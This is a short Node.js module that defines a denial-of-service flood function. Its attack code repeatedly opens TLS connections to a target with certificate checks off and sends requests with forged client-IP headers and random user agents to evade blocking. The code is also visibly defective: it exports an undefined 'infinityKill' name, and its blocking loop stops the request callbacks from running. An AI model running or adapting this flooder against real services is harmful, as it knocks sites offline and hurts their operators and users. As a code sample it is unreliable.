const tls = require('tls');

function spoofFlood(host, port, duration) {
  const end = Date.now() + duration*1000;
  while(Date.now() < end){
    const socket = tls.connect({host, port, servername: host, rejectUnauthorized: false}, ()=>{
      const req = 
        `GET / HTTP/1.1\r\n`+
        `Host: ${host}\r\n`+
        `User-Agent: ${global.randUA()}\r\n`+
        `X-Forwarded-For: ${global.randIP()}\r\n`+
        `Client-IP: ${global.randIP()}\r\n`+
        `X-Real-IP: ${global.randIP()}\r\n`+
        `Connection: close\r\n\r\n`;
      socket.write(req);
      socket.end();
    });
    socket.on('error',()=>{});
  }
}

module.exports = { infinityKill };